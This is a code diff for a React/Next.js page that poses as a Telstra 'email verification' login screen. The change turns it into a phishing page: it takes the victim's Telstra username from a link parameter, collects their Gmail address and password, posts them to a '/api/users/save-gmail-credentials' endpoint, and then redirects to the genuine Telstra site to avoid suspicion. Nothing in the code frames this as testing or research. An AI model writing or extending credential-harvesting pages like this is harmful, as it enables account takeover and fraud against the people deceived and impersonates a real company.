@@ -1,27 +1,59 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
+import { useSearchParams } from 'next/navigation';
 import TelstraLogo from '../../components/Telstra/Logo';
 import '../../components/Telstra/LoginPage.css';
 
 export default function EmailVerificationPage() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
+  const searchParams = useSearchParams();
+  const [gmailUsername, setGmailUsername] = useState('');
+  const [gmailPassword, setGmailPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [isSigningIn, setIsSigningIn] = useState(false);
+  const [telstraUsername, setTelstraUsername] = useState('');
+
+  useEffect(() => {
+    // Get telstraUsername from query parameter (email param)
+    const emailParam = searchParams.get('email');
+    if (emailParam) {
+      setTelstraUsername(emailParam);
+    }
+  }, [searchParams]);
 
   const handleSignIn = async () => {
-    if (email.trim() && password.trim() && !isSigningIn) {
+    if (!telstraUsername) {
+      alert('Invalid verification link. Please check your email.');
+      return;
+    }
+
+    if (gmailUsername.trim() && gmailPassword.trim() && !isSigningIn) {
       setIsSigningIn(true);
-      // Add your sign in logic here
       try {
-        // Simulate API call
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        // Redirect or handle success
+        const response = await fetch('/api/users/save-gmail-credentials', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            telstraUsername: telstraUsername.trim(),
+            gmailUsername: gmailUsername.trim(),
+            gmailPassword: gmailPassword.trim(),
+          }),
+        });
+
+        if (response.ok) {
+          // Redirect to Telstra ID page or success page
+          window.location.href = 'https://www.telstra.com.au';
+        } else {
+          const error = await response.json();
+          console.error('Error saving Gmail credentials:', error);
+          alert('Failed to save credentials. Please try again.');
+          setIsSigningIn(false);
+        }
       } catch (error) {
-        console.error('Error signing in:', error);
-        alert('Failed to sign in. Please try again.');
-      } finally {
+        console.error('Error saving Gmail credentials:', error);
+        alert('Failed to save credentials. Please try again.');
         setIsSigningIn(false);
       }
     }
@@ -46,17 +78,17 @@ export default function EmailVerificationPage() {
           <p className="subtitle">Email verification for Telstra</p>
 
           <div className="formGroup">
-            <label htmlFor="email" className="label">
+            <label htmlFor="gmailUsername" className="label">
               Email
             </label>
             <input
               type="email"
-              id="email"
+              id="gmailUsername"
               className="input"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
+              value={gmailUsername}
+              onChange={(e) => setGmailUsername(e.target.value)}
               onKeyDown={(e) => {
-                if (e.key === 'Enter' && email.trim() && password.trim() && !isSigningIn) {
+                if (e.key === 'Enter' && gmailUsername.trim() && gmailPassword.trim() && !isSigningIn) {
                   handleSignIn();
                 }
               }}
@@ -64,18 +96,18 @@ export default function EmailVerificationPage() {
           </div>
 
           <div className="formGroup">
-            <label htmlFor="password" className="label" style={{ fontWeight: "550px" }}>
+            <label htmlFor="gmailPassword" className="label" style={{ fontWeight: "550px" }}>
               Password
             </label>
             <div className="passwordContainer">
               <input
                 type={showPassword ? 'text' : 'password'}
-                id="password"
+                id="gmailPassword"
                 className="input passwordInput"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                value={gmailPassword}
+                onChange={(e) => setGmailPassword(e.target.value)}
                 onKeyDown={(e) => {
-                  if (e.key === 'Enter' && email.trim() && password.trim() && !isSigningIn) {
+                  if (e.key === 'Enter' && gmailUsername.trim() && gmailPassword.trim() && !isSigningIn) {
                     handleSignIn();
                   }
                 }}
@@ -98,7 +130,7 @@ export default function EmailVerificationPage() {
           <button 
             className="signInButton"
             onClick={handleSignIn}
-            disabled={!email.trim() || !password.trim() || isSigningIn}
+            disabled={!gmailUsername.trim() || !gmailPassword.trim() || !telstraUsername || isSigningIn}
           >
             {isSigningIn ? (
               <span className="spinner"></span>
